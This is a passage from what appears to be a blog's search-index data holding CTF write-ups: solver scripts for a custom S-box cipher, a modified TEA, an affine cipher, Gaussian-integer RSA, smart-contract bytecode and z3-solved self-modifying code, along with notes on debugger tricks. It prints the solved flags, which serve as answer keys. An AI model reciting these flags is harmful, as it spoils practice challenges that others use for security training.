0x43, 0xEF, 0xB2, 0x8A]key_t = [0x58, 0x2F, 0x36, 0xDD, 0x92, 0xF2, 0x79, 0x09, 0xC8, 0x73, 0x6F, 0x0A, 0x36, 0x14, 0x6F, 0x43, 0xB7, 0x1A, 0x21, 0xD0, 0x25, 0xE8, 0x58, 0xD9, 0xED, 0x9B, 0x37, 0xD3, 0xDB, 0x8F, 0x58, 0x90, 0x55, 0x7D, 0x4C, 0x5C, 0x70, 0x95, 0x14, 0x85, 0x9D, 0x0E, 0x23, 0x56, 0x46, 0x81, 0x7B, 0xC6, 0x6C, 0xF6, 0x8D, 0x4F, 0x1C, 0x63, 0x99, 0xCA, 0x81, 0x6D, 0xBA, 0x9C, 0xC7, 0xEC, 0xC1, 0x5A, 0xA5, 0x79, 0x86, 0x50, 0xB9, 0x1A, 0x1F, 0x9A, 0x38, 0x77, 0xA5, 0x06, 0xFF, 0x9B, 0x64, 0x5C, 0x10, 0xBF, 0x28, 0x66, 0xA9, 0xA5, 0x37, 0xFC, 0x91, 0xD2, 0x92, 0xFA, 0x6E, 0x49, 0xF6, 0xA6, 0x42, 0xD6, 0x3C, 0x5E, 0xEB, 0x73, 0x0B, 0xA2, 0x7A, 0xA1, 0x99, 0x58, 0x14, 0xE8, 0x6F, 0xFE, 0x1D, 0xE3, 0x3A, 0xB3, 0xF6, 0x90, 0x31, 0x11, 0x8C, 0x31, 0xA8, 0x49, 0x98, 0xD9, 0xC7, 0xB7, 0x66, 0xFC, 0xE2, 0x77, 0x90, 0x6C, 0xD3, 0x66, 0x1C, 0x5D, 0x7B, 0x2F, 0x84, 0x84, 0xBC, 0x98, 0x70, 0x64, 0x26, 0x57, 0xE0, 0x08, 0xF5, 0x31, 0xFC, 0x55, 0x8E, 0x1E, 0x78, 0xD1, 0x32, 0x86, 0x36, 0xC2, 0x96, 0xDE, 0xD6, 0xCA, 0x63, 0xEF, 0x2A, 0x9F, 0xED, 0xF1, 0x52, 0x4E, 0xDF, 0x77, 0x63, 0xB1, 0xF2, 0x20, 0xB5, 0x7B, 0x91, 0xCF, 0x9F, 0xE4, 0x7C, 0x3E, 0xCD, 0xAA, 0xA3, 0x49, 0xF2, 0xD7, 0xE0, 0x5F, 0x47, 0xAC, 0x71, 0x90, 0xD8, 0x48, 0x0D, 0xAE, 0x15, 0xE2, 0xAE, 0xE7, 0xD5, 0xCC, 0x29, 0x03, 0x92, 0x60, 0x58, 0x93, 0x4A, 0x28, 0x55, 0x3D, 0x5F, 0xCA, 0xFB, 0xDA, 0x79, 0xCF, 0xD9, 0x07, 0xEB, 0xAF, 0x81, 0x94, 0xA1, 0x87, 0xD4, 0xA9, 0xFE, 0x4D, 0x2F, 0x73, 0x56, 0x36, 0xE5, 0x01, 0xBD, 0x99, 0x64, 0x95, 0x1C, 0x1E, 0xB0, 0x3C, 0xE2, 0x53, 0x9F, 0x4F, 0x13, 0x2E, 0x2F, 0x26, 0xAE, 0xB7, 0x4B, 0xB3, 0xB2, 0xA9, 0xFB, 0x8F, 0x50, 0xFA, 0x64, 0xC0, 0x85, 0xE8, 0x33, 0x8D, 0x2B, 0x5F, 0x78, 0x3E, 0x99, 0xF6, 0x83, 0xB1, 0xC9, 0x0C, 0xE7, 0x71, 0x04, 0x21, 0x0D, 0x43, 0x2F, 0x7E, 0x75, 0x7D, 0xB6, 0x88, 0xF6, 0xCC, 0x7F, 0x84, 0x11, 0xBD, 0x24, 0x6F, 0x4F, 0xD7, 0x0B, 0x11, 0x3A, 0xAA, 0xBD, 0x99, 0xCC, 0x66, 0xC2, 0x1D, 0xDD, 0xDB, 0x69, 0xAF, 0xC3, 0x88, 0x62, 0xBE, 0xF9, 0x22, 0xDF, 0x27, 0x35, 0x44, 0x1D, 0x3A, 0xE8, 0x9F, 0x61, 0x70, 0xDB, 0xC5, 0x03, 0xCE, 0x22, 0xE7, 0xDC, 0xE9, 0x17, 0xA3, 0xC1, 0xD3, 0xFF, 0x3C, 0x02]SBOX = [0x28, 0x90, 0xC3, 0x41, 0xC2, 0x75, 0x84, 0xDA, 0x79, 0xE7, 0x21, 0x0C, 0x81, 0xD5, 0xBF, 0x92, 0xB8, 0x4E, 0xB1, 0x2D, 0xED, 0x5C, 0xCB, 0x99, 0x6A, 0x32, 0x6F, 0xF2, 0x52, 0x4D, 0x29, 0x77, 0x49, 0x1D, 0xBB, 0x3A, 0x9F, 0x02, 0x1A, 0x71, 0x58, 0x72, 0xBA, 0xA1, 0x5E, 0xFA, 0x48, 0xF9, 0xFC, 0xF7, 0xA6, 0x97, 0x9D, 0x24, 0x0D, 0xE0, 0xF3, 0x37, 0x08, 0xEA, 0xF5, 0x6B, 0x86, 0xEF, 0x8D, 0x61, 0x65, 0x17, 0xD7, 0x7E, 0x13, 0x9C, 0xCC, 0x12, 0x33, 0x8E, 0x7D, 0x2F, 0x55, 0xCA, 0xAB, 0xE4, 0xFE, 0x45, 0xD6, 0xF6, 0xDE, 0xF1, 0x67, 0xE1, 0x0B, 0xB2, 0xAE, 0xCF, 0x7C, 0x04, 0x0E, 0x16, 0xA2, 0x00, 0xC6, 0xFF, 0x2C, 0x1E, 0x47, 0x30, 0xA4, 0x40, 0x4B, 0x15, 0x38, 0x35, 0xAF, 0x3E, 0x39, 0x3C, 0xD2, 0x85, 0xC7, 0x64, 0x89, 0xFD, 0xE8, 0x8B, 0x43, 0xC8, 0x22, 0x94, 0xA8, 0x31, 0xA3, 0xB9, 0x20, 0xEB, 0xB0, 0x01, 0x3D, 0x68, 0x5A, 0x93, 0x5B, 0x4F, 0x50, 0xE6, 0x6D, 0xF4, 0x44, 0x10, 0x80, 0xA7, 0x51, 0xD3, 0xC4, 0x2B, 0x88, 0x95, 0xA5, 0x70, 0x23, 0x18, 0x09, 0x4A, 0x19, 0x66, 0xDC, 0xEC, 0x14, 0xA9, 0xDB, 0xE2, 0x91, 0x4C, 0x57, 0x82, 0x1B, 0x2A, 0x11, 0x7B, 0x5D, 0x8A, 0xD4, 0xA0, 0x07, 0xD8, 0x53, 0x9B, 0x26, 0xD1, 0x98, 0x42, 0x0A, 0x9A, 0x1C, 0x8F, 0x5F, 0x63, 0xE9, 0xCD, 0xC1, 0x1F, 0x6C, 0xCE, 0xAC, 0xAA, 0xD0, 0x7F, 0x59, 0xBE, 0xB6, 0x46, 0xB7, 0x83, 0xEE, 0x7A, 0x9E, 0xC5, 0x62, 0x60, 0xF0, 0x8C, 0x2E, 0xC0, 0xDD, 0x73, 0x56, 0x76, 0x27, 0xB5, 0x25, 0x74, 0x6E, 0xC9, 0xDF, 0xB4, 0x34, 0x05, 0xD9, 0xB3, 0xBD, 0x3B, 0x54, 0xAD, 0x0F, 0x87, 0x78, 0xFB, 0x69, 0xF8, 0xBC, 0xE3, 0x96, 0x03, 0x3F, 0xE5, 0x06, 0x36]key = [bytearray(b&quot;vMBixpswDVgJhpZd&quot;),[a1[i] for i in range(16)],[a1[i] for i in range(16,32)]]for i in range(3): for p in range(21,-1,-1): row_re(i) for j in range(i*16,(i+1)*16): a1[j] = SBOX.index(a1[j]) for k in range(16): a1[i*16+k] ^= key_t[p*16 + k] for l in range(16): a1[l+16*i] ^= key[i][l]bytearray(a1)# SYC&#123;ZtZJpWvEthTkaDzLQznEYLybEcNOPfmlukmZbzXBhih&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"re_base1","slug":"re-base1","date":"2022-12-17T13:16:25.000Z","updated":"2022-12-17T13:36:34.076Z","comments":true,"path":"2022/12/17/re-base1/","link":"","permalink":"https://pa1r0t.github.io/2022/12/17/re-base1/","excerpt":"re_OD debugger1","text":"re_OD debugger1 查找main函数的五种方法运行程序，看见弹窗，盲猜是user32.GetmessageW()的api 方法一： 1.不断地F7步入函数 2.看见一些红色api，即一些库函数，就Ctrl+F9跳出此函数 3.直到看见弹窗函数 方法二： 1.不断地F8步过函数 2.直到某个函数执行了弹窗函数，然后在此函数之上下断，然后ctrl+F2重新开始 3.直到找到弹窗函数 方法三： 1.通过查找api的方式查找main函数 2.右键查看模块间的调用函数 3.找到弹窗函数即可 方法四： 1.Ctrl+n查找所有内存的api 方法五： 1.查找字符串,右键即可 这里修改dump窗口的数据，选中数据后摁ctrl+E 修改后右键复制到文件 在dump窗口中，右键保存文件即可","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"信创网安wp","slug":"信创网安wp","date":"2022-12-05T02:42:19.000Z","updated":"2022-12-05T03:12:44.452Z","comments":true,"path":"2022/12/05/信创网安wp/","link":"","permalink":"https://pa1r0t.github.io/2022/12/05/%E4%BF%A1%E5%88%9B%E7%BD%91%E5%AE%89wp/","excerpt":"省排名：22 web师傅纠结于web最后一题，所以杂项一道没做。然后我把仿射密码的做题思路给忘了，然后密码0解，至于pwn….","text":"省排名：22 web师傅纠结于web最后一题，所以杂项一道没做。然后我把仿射密码的做题思路给忘了，然后密码0解，至于pwn…. RevShift123456789101112str1=&#x27;≁⧃⩆㷕⿤ᩣᡤ㋟㩨ᣳ⿃ᣰ㑥㥟⫴㍽&#x27;print(str1)for i in str1: t = ord(i)&amp;0xff if t &gt; 128: print(chr(ord(i) &gt;&gt; 7)+chr((ord(i)-128)&amp;0xff),end=&#x27;&#x27;) else: print(chr(ord(i) &gt;&gt; 7)+chr((ord(i))&amp;0xff),end=&#x27;&#x27;)f.close()print(int(&#x27;10000000&#x27;,2))# DASCTF&#123;U_d4c0de_th1s_C1pher_Utf&#125; ReContract1.智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行2.然后又找到一篇文章，上面写着一个在线工具3.直接将字节码复制进去翻译即可4.这里看见有五个可疑数字，拿去转字符串看看5.发现顺序是乱的，以我神级英语水平，大概的顺序就是:’反编译智能合约字节码真的不错’,hhhhhhhhhhhh12345678from Crypto.Util.number import *print(long_to_bytes(0x4279746563306465355f00000000000000000000000000000000000000000000))print(long_to_bytes(0x4441534354467b00000000000000000000000000000000000000000000000000))print(long_to_bytes(0x536d3472745f43306e74724063745f0000000000000000000000000000000000))print(long_to_bytes(0x443363306d70316c655f00000000000000000000000000000000000000000000))print(long_to_bytes(0x31735f46756e4e792e7d00000000000000000000000000000000000000000000))# DASCTF&#123;D3c0mp1le_Sm4rt_C0ntr@ct_Bytec0de5_1s_FunNy.&#125; 赛后复现密码—–逆向第三道懒得复现，还有密码第三道。。。。。。&#x3D;&#x3D;看了一遍代码就把文件扔到回收站了&#x3D;&#x3D; easy_Affline这道题题目给的a，b数字太大，我以为要爆破很长的区间，其实不用，经过我脚本的测试，发现大数字和小数字的结果是相同的，所以只需遍历0~m即可 1234567891011121314151617181920212223242526272829303132333435from Crypto.Util.number import *import randomtext = &#x27;aCdhpnlmNKuRJbfVIXUvyTrSPqjBMzgwHZkAxWGiYetEsocDLFOQ&#x27;cipher = &#x27;CezmBh&#123;BKDdD_oP_rKD_rdtF_cMHu&#125;&#x27;flag=&#x27;DASCTF&#x27;i = 0def d(): for a in range(2, 52): for b in range(2, 52): if GCD(a,52) == 1: break c = &#x27;&#x27; t = inverse(a,52) for i in cipher: x = text.find(i) c += text[t*(x-b) % len(text)] if c == flag: print(a,b) return d()a = 2b = 6t = inverse(a,52)flag = &#x27;&#x27;for i in cipher: if i not in text: flag += i else: x = text.find(i) flag += text[t*(x-b) % len(text)]print(flag)# DASCTF&#123;TheLe_iU_Ihe_ILxE_Yrjp&#125; gauss_systemsage解即可 12345678910111213k = 1751007263671615053487807501173970925758538c = 463982900309034681135307002234842926080979p, q = var(&quot;p, q&quot;)assume(p, &quot;integer&quot;)assume(q, &quot;integer&quot;)sol = solve((p - 1003) ** 2 + (q - 48) ** 2 == k, p, q)for p, q in sol: if p &gt; 0 and q &gt; 0: p, q = int(p), int(q) if is_prime(p) and is_prime(q): print(p) print(q) 12345678910111213141516import libnumimport gmpy2from Crypto.Util.number import *e = 0x10001s = 1751007263671615053487807501173970925758538c = 463982900309034681135307002234842926080979p = 1087638045546779918273q = 753691412682137267747assert p**2 + q**2 == sphi = (p-1)*(q-1)d = libnum.invmod(e,phi)n = p*qm = pow(c,d,n)long_to_bytes(m)# Z[i]_15_m4g1c","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"NOV X联合出题人","slug":"buuctf-nov","date":"2022-11-29T08:52:11.000Z","updated":"2022-11-30T09:27:57.484Z","comments":true,"path":"2022/11/29/buuctf-nov/","link":"","permalink":"https://pa1r0t.github.io/2022/11/29/buuctf-nov/","excerpt":"​ 比赛一直在打安洵杯，buu都没好好看，现在安洵杯迷宫题斜着走还没搞明白，先来复现一波buu的月赛","text":"​ 比赛一直在打安洵杯，buu都没好好看，现在安洵杯迷宫题斜着走还没搞明白，先来复现一波buu的月赛 babytea1. 一 看核心算法经典tea2. 结果脚本算不出来&#x3D;&#x3D;，我还以为老子脚本有问题，动调发现有异常，直接去看汇编，结果发现果然存在几个异常点a)sum+异常b)开头也有异常，而且这个是默认必须跳转3.直接修改汇编，让报错的地方直接跳转到异常处理程序4.然后源码就变了5.但是v5地方不是每次都要异或，是有条件的，当&gt;&gt;0x1f &#x3D;&#x3D; 0时异或6.总之这是一道魔改tea罢了，脚本如下123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Util.number import *def tea(v,k,d38,d3c): v0 = v[0] v1 = v[1] s = 0 j = [0] # sum for i in range(32): s = (s + dword_41F000)&amp;0xffffffff if (s &gt;&gt; 0x1f) == 0: s ^= 0x1234567 j.append(s) sum = j[32] for i in range(32): v1 -= (k[3] + (v0 &gt;&gt; 5)) ^ (sum + v0) ^ (k[2] + 16 * v0) v1 = v1&amp;0xffffffff v0 -= (k[1] + (v1 &gt;&gt; 5)) ^ (sum + v1) ^ (k[0] + 16 * v1) v0 = v0&amp;0xffffffff sum = j[31-i] v0 ^= d38 v1 ^= d3c v[0] = v0&amp;0xffffffff v[1] = v1&amp;0xffffffffenc = [0x5E27B530, 0x0BDBEF7F3, 0x0E3516A8F, 0x5D836CFE, 0x0D83DFA09, 0x8EFC737A,0x55A853A3, 0x7A564EC5]k = [0x67452301, 0x0EFCDAB89, 0x98BADCFE, 0x10325476]m = [None]*2flag = []dword_41F038 = [0x1234567,0x5E27B530,0x0E3516A8F,0x0D83DFA09]dword_41F03C = [0x89ABCDEF,0x0BDBEF7F3,0x5D836CFE,0x8EFC737A]dword_41F000 = 0x9E3779B1for i in range(4): m[0] = enc[2*i] m[1] = enc[2*i+1] tea(m,k,dword_41F038[i],dword_41F03C[i]) flag.append(long_to_bytes(m[0])[::-1]) flag.append(long_to_bytes(m[1])[::-1])b&#x27;&#x27;.join(flag)#600d_y0u_r34lly_kn0w_734_4nd_53h babysmc1. smc函数，但是异或值是输入的值2. 其他也没有和输入值相关的函数，所以只能选择爆破3. 当爆破到第一个操作时push ebp时那就成功了，所以硬编码就为0x55，先是loc50，第一个值是574. 但是爆破失败，真的是糟糕！！！5. 后面发现还有一个函数，这个函数居然爆破成功了，奇了个怪6. 后面惊奇地发现第一个函数应该被异或了两次，进过256长度的计算，确实如此7. 然后就爆破出来了，yes，用idc改编码8. 改完之后从修改开始处到return代码全部重新分析一遍，因为256长度把已经分析了的代码也改了，然后重新生成函数9. 然后逻辑就是循环十次，不同函数调用十次，最后用z3解这里附上代码，仅供参考123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656from z3 import *dword_422040 = [0x00027FC8, 0x00029049, 0x0003336C, 0x0002C6A7, 0x00036CB0, 0x0001F2BB, 0x00035262, 0x0002AEDF, 0x0002955E, 0x0002EE10, 0x0002B057, 0x0002FDE8, 0x00029B92, 0x00035842, 0x000294D2, 0x0002B984]flag = [0] * 34s = Solver()a1 = [BitVec(f&#x27;flag[&#123;i&#125;]&#x27;,8) for i in range(17,33)]s.add(dword_422040[0] == (159 * a1[8] \\ + 109 * a1[12] \\ + 14 * a1[0] \\ + 92 * a1[14] \\ + 211 * a1[4] \\ + 178 * a1[7] \\ + 57 * a1[2] \\ + 175 * a1[5] \\ + 170 * a1[11] \\ + 59 * a1[6] \\ + 200 * a1[9] \\ + 5 * a1[15] \\ + 48 * a1[13] \\ + 28 * a1[3] \\ + 18 * a1[10] \\ + 228 * a1[1])&amp;0xffffffff)s.add(dword_422040[6] == (173 * a1[11] \\ + 34 * a1[5] \\ + 69 * a1[4] \\ + 216 * a1[14] \\ + 225 * a1[9] \\ + 160 * a1[1] \\ + 207 * a1[10] \\ + 175 * a1[7] \\ + 121 * a1[0] \\ + 122 * a1[2] \\ + 179 * a1[12] \\ + 91 * a1[13] \\ + 181 * a1[8] \\ + 93 * a1[3] \\ + 121 * a1[6] \\ + 12 * a1[15])&amp;0xffffffff)s.add(dword_422040[8] == (215 * a1[11] \\ + 164 * a1[5] \\ + 97 * a1[2] \\ + 99 * a1[3] \\ + 188 * a1[4] \\ + ((a1[9] &lt;&lt; 7)&amp;0xffffffff) \\ + 214 * a1[6] \\ + 106 * a1[8] \\ + 169 * a1[0] \\ + 28 * a1[14] \\ + 18 * a1[12] \\ + a1[1] \\ + 177 * a1[10] \\ + 114 * a1[7] \\ + 176 * a1[15] \\ + 25 * a1[13])&amp;0xffffffff)s.add(dword_422040[9] == (175 * a1[14] \\ + 42 * a1[4] \\ + 214 * a1[12] \\ + 43 * a1[13] \\ + 147 * a1[6] \\ + 53 * a1[10] \\ + 12 * a1[1] \\ + 213 * a1[7] \\ + 241 * a1[9] \\ + 223 * a1[5] \\ + 65 * a1[3] \\ + 42 * a1[15] \\ + 131 * a1[2] \\ + 81 * a1[0] \\ + 92 * a1[11] \\ + 110 * a1[8])&amp;0xffffffff)s.add(dword_422040[13] == (57 * a1[0] \\ + 109 * a1[7] \\ + 60 * a1[2] \\ + 228 * a1[13] \\ + 166 * a1[4] \\ + 236 * a1[9] \\ + 100 * a1[6] \\ + 179 * a1[11] \\ + 20 * a1[12] \\ + 45 * a1[8] \\ + 204 * a1[3] \\ + 182 * a1[14] \\ + 84 * a1[10] \\ + 170 * a1[15] \\ + 199 * a1[5] \\ + 138 * a1[1])&amp;0xffffffff)s.add(dword_422040[10] == (98 * a1[11] \\ + 122 * a1[9] \\ + 237 * a1[12] \\ + 117 * a1[0] \\ + 34 * a1[3] \\ + 168 * a1[8] \\ + 135 * a1[10] \\ + 119 * a1[6] \\ + 91 * a1[2] \\ + 161 * a1[15] \\ + 152 * a1[7] \\ + 186 * a1[4] \\ + 187 * a1[13] \\ + 72 * a1[14] \\ + 36 * a1[5] \\ + 171 * a1[1])&amp;0xffffffff)s.add(dword_422040[7] == (184 * a1[9] \\ + 112 * a1[0] \\ + 107 * a1[11] \\ + 170 * a1[13] \\ + 55 * a1[8] \\ + 85 * a1[14] \\ + 212 * a1[10] \\ + 173 * a1[15] \\ + 166 * a1[12] \\ + 142 * a1[4] \\ + 202 * a1[5] \\ + 63 * a1[2] \\ + 30 * a1[7] \\ + 175 * a1[3] \\ + 217 * a1[6] \\ + 63 * a1[1])&amp;0xffffffff)s.add(dword_422040[15] == (((a1[7] &lt;&lt; 6)&amp;0xffffffff) \\ + 228 * a1[4] \\ + 90 * a1[11] \\ + 85 * a1[3] \\ + 196 * a1[6] \\ + 219 * a1[0] \\ + 93 * a1[14] \\ + 183 * a1[15] \\ + 156 * a1[12] \\ + 197 * a1[8] \\ + 119 * a1[13] \\ + 36 * a1[10] \\ + 205 * a1[2] \\ + 94 * a1[9] \\ + 153 * a1[5])&amp;0xffffffff)s.add(dword_422040[5] == (9 * a1[4] \\ + ((a1[5] &lt;&lt; 6)&amp;0xffffffff) \\ + 62 * a1[1] \\ + 58 * a1[7] \\ + 100 * a1[13] \\ + 137 * a1[11] \\ + 6 * a1[0] \\ + 119 * a1[9] \\ + 180 * a1[6] \\ + 228 * a1[8] \\ + 88 * a1[12] \\ + 107 * a1[15] \\ + 56 * a1[14] \\ + 207 * a1[2] \\ + 248 * a1[10] \\ + 150 * a1[3])&amp;0xffffffff)s.add(dword_422040[3] == (38 * a1[7] \\ + 194 * a1[4] \\ + 105 * a1[0] \\ + 150 * a1[6] \\ + 75 * a1[1] \\ + 89 * a1[15] \\ + 99 * a1[14] \\ + 98 * a1[3] \\ + 91 * a1[8] \\ + 178 * a1[12] \\ + 117 * a1[2] \\ + 48 * a1[13] \\ + 239 * a1[10] \\ + 233 * a1[11] \\ + 63 * a1[5] \\ + 250 * a1[9])&amp;0xffffffff)s.add(dword_422040[11] == (30 * a1[8] \\ + 13 * a1[5] \\ + 206 * a1[3] \\ + 234 * a1[15] \\ + 71 * a1[7] \\ + 239 * a1[12] \\ + 141 * a1[10] \\ + 179 * a1[13] \\ + 113 * a1[14] \\ + 181 * a1[9] \\ + 52 * a1[6] \\ + 74 * a1[11] \\ + 168 * a1[4] \\ + 239 * a1[1] \\ + 164 * a1[0] \\ + 179 * a1[2])&amp;0xffffffff)s.add(dword_422040[14] == (211 * a1[1] \\ + 74 * a1[5] \\ + 144 * a1[8] \\ + 234 * a1[0] \\ + 241 * a1[2] \\ + 157 * a1[11] \\ + 25 * a1[15] \\ + 6 * a1[10] \\ + 243 * a1[6] \\ + 107 * a1[9] \\ + 77 * a1[12] \\ + 127 * a1[4] \\ + 67 * a1[7] \\ + 13 * a1[14] \\ + 151 * a1[3] \\ + 127 * a1[13])&amp;0xffffffff)s.add(dword_422040[2] == (209 * a1[9] \\ + 110 * a1[7] \\ + 22 * a1[10] \\ + 102 * a1[11] \\ + 187 * a1[1] \\ + 58 * a1[8] \\ + 236 * a1[6] \\ + 146 * a1[13] \\ + 205 * a1[15] \\ + 63 * a1[2] \\ + 211 * a1[4] \\ + 152 * a1[3] \\ + 82 * a1[14] \\ + 14 * a1[5] \\ + 49 * a1[12] \\ + 251 * a1[0])&amp;0xffffffff)s.add(dword_422040[12] == (230 * a1[0] \\ + 27 * a1[3] \\ + 186 * a1[10] \\ + 58 * a1[7] \\ + 121 * a1[1] \\ + 59 * a1[14] \\ + 90 * a1[12] \\ + 40 * a1[2] \\ + 230 * a1[11] \\ + 25 * a1[6] \\ + 198 * a1[5] \\ + 81 * a1[4] \\ + 71 * a1[13] \\ + 180 * a1[8] \\ + 149 * a1[9] \\ + 73 * a1[15])&amp;0xffffffff)s.add(dword_422040[4] == (188 * a1[5] \\ + 80 * a1[1] \\ + 221 * a1[6] \\ + ((a1[12] &lt;&lt; 6)&amp;0xffffffff) \\ + 230 * a1[3] \\ + 123 * a1[8] \\ + 124 * a1[11] \\ + 253 * a1[0] \\ + 202 * a1[10] \\ + 63 * a1[2] \\ + 40 * a1[7] \\ + 109 * a1[9] \\ + 195 * a1[15] \\ + 199 * a1[13] \\ + 82 * a1[4] \\ + 225 * a1[14])&amp;0xffffffff)s.add(dword_422040[1] == (236 * a1[15] \\ + 44 * a1[14] \\ + 214 * a1[13] \\ + 52 * a1[8] \\ + 37 * a1[6] \\ + 101 * a1[9] \\ + 244 * a1[10] \\ + 238 * a1[11] \\ + 109 * a1[0] \\ + 188 * a1[1] \\ + 20 * a1[3] \\ + 87 * a1[7] \\ + 93 * a1[4] \\ + 158 * a1[5] \\ + 105 * a1[12] \\ + 3 * a1[2])&amp;0xffffffff)assert s.check() == satprint(s.model())flag[28] = 114flag[18] = 42flag[21] = 71flag[27] = 42flag[30] = 124flag[32] = 51flag[23] = 42flag[26] = 186flag[31] = 209flag[17] = 186flag[24] = 186flag[29] = 11flag[20] = 45flag[19] = 51flag[22] = 51flag[25] = 25dword_422000 = [0x0002A81A, 0x00028D44, 0x00022653, 0x0002E993, 0x000249B5, 0x00024265, 0x0003253D, 0x0002D77B, 0x000282C8, 0x00022892, 0x0002BD54, 0x0002482E, 0x00024C1F, 0x00028127, 0x0001E62E, 0x0001F009]x = Solver()a1 = [BitVec(f&#x27;flag[&#123;i&#125;]&#x27;,8) for i in range(1,17)]x.add(dword_422000[12] == (199 * a1[9] \\ + 98 * a1[7] \\ + 192 * a1[8] \\ + 23 * a1[12] \\ + 79 * a1[14] \\ + 77 * a1[10] \\ + 185 * a1[13] \\ + 135 * a1[15] \\ + 119 * a1[4] \\ + 54 * a1[0] \\ + 41 * a1[1] \\ + 124 * a1[6] \\ + 18 * a1[2] \\ + 181 * a1[11] \\ + 191 * a1[5] \\ + 7 * a1[3])&amp;0xffffffff)x.add(dword_422000[3] == (210 * a1[11] \\ + 26 * a1[15] \\ + 169 * a1[0] \\ + 177 * a1[13] \\ + a1[6] \\ + 205 * a1[8] \\ + 223 * a1[10] \\ + 32 * a1[5] \\ + 225 * a1[3] \\ + 61 * a1[14] \\ + 72 * a1[1] \\ + 186 * a1[9] \\ + 253 * a1[12] \\ + 205 * a1[2] \\ + 49 * a1[4] \\ + 232 * a1[7])&amp;0xffffffff)x.add(dword_422000[13] == (192 * a1[3] \\ + 22 * a1[10] \\ + 175 * a1[1] \\ + 184 * a1[7] \\ + 116 * a1[15] \\ + 70 * a1[13] \\ + 153 * a1[14] \\ + 119 * a1[0] \\ + 217 * a1[6] \\ + 123 * a1[5] \\ + 17 * a1[2] \\ + 244 * a1[12] \\ + 116 * a1[8] \\ + 46 * a1[4] \\ + 19 * a1[9] \\ + 130 * a1[11])&amp;0xffffffff)x.add(dword_422000[7] == (41 * a1[12] \\ + 71 * a1[7] \\ + 185 * a1[1] \\ + 69 * a1[11] \\ + 142 * a1[8] \\ + 221 * a1[5] \\ + 24 * a1[3] \\ + 208 * a1[6] \\ + 41 * a1[9] \\ + 159 * a1[2] \\ + 231 * a1[14] \\ + 235 * a1[13] \\ + 225 * a1[0] \\ + (a1[4] &lt;&lt; 6) \\ + 162 * a1[10] \\ + 134 * a1[15])&amp;0xffffffff)x.add(dword_422000[11] == (36 * a1[12] \\ + 220 * a1[4] \\ + 110 * a1[13] \\ + 45 * a1[7] \\ + 123 * a1[9] \\ + 133 * a1[1] \\ + 101 * a1[5] \\ + 137 * a1[10] \\ + 102 * a1[0] \\ + 227 * a1[14] \\ + 94 * a1[15] \\ + 18 * a1[2] \\ + 22 * a1[6] \\ + 189 * a1[11] \\ + 218 * a1[8])&amp;0xffffffff)x.add(dword_422000[15] == (86 * a1[11] \\ + 31 * a1[9] \\ + 229 * a1[6] \\ + 27 * a1[3] \\ + 6 * a1[12] \\ + 13 * a1[10] \\ + 158 * a1[1] \\ + 89 * a1[7] \\ + 35 * a1[15] \\ + 126 * a1[8] \\ + 165 * a1[13] \\ + 220 * a1[0] \\ + 138 * a1[5] \\ + 100 * a1[4] \\ + 84 * a1[14] \\ + 175 * a1[2])&amp;0xffffffff)x.add(dword_422000[8] == (7 * a1[1] \\ + 28 * a1[8] \\ + 131 * a1[10] \\ + 6 * a1[6] \\ + 254 * a1[0] \\ + 130 * a1[13] \\ + 124 * a1[3] \\ + 55 * a1[12] \\ + 157 * a1[14] \\ + 175 * a1[5] \\ + 140 * a1[4] \\ + 241 * a1[9] \\ + 11 * a1[11] \\ + 211 * a1[2] \\ + 121 * a1[7] \\ + 200 * a1[15])&amp;0xffffffff)x.add(dword_422000[6] == (195 * a1[14] \\ + 197 * a1[13] \\ + 218 * a1[7] \\ + 83 * a1[1] \\ + 98 * a1[2] \\ + 70 * a1[10] \\ + 229 * a1[15] \\ + 148 * a1[11] \\ + 195 * a1[0] \\ + 94 * a1[6] \\ + 211 * a1[12] \\ + 220 * a1[9] \\ + 81 * a1[5] \\ + 253 * a1[8] \\ + 78 * a1[4] \\ + 4 * a1[3])&amp;0xffffffff)x.add(dword_422000[14] == (3 * a1[4] \\ + 136 * a1[7] \\ + 156 * a1[3] \\ + 189 * a1[1] \\ + 244 * a1[12] \\ + 157 * a1[15] \\ + 83 * a1[9] \\ + 6 * a1[0] \\ + 113 * a1[6] \\ + 63 * a1[14] \\ + 35 * a1[2] \\ + 22 * a1[8] \\ + 26 * a1[10] \\ + 62 * a1[11] \\ + 98 * a1[5] \\ + 110 * a1[13])&amp;0xffffffff)x.add(dword_422000[4] == (96 * a1[4] \\ + 248 * a1[8] \\ + 191 * a1[9] \\ + 194 * a1[2] \\ + 154 * a1[1] \\ + 31 * a1[6] \\ + 157 * a1[7] \\ + 248 * a1[13] \\ + 81 * a1[15] \\ + 56 * a1[10] \\ + 52 * a1[0] \\ + 94 * a1[12] \\ + 212 * a1[5] \\ + 83 * a1[3] \\ + 83 * a1[14] \\ + 158 * a1[11])&amp;0xffffffff)x.add(dword_422000[1] == (67 * a1[4] \\ + 220 * a1[2] \\ + 123 * a1[11] \\ + 168 * a1[5] \\ + 23 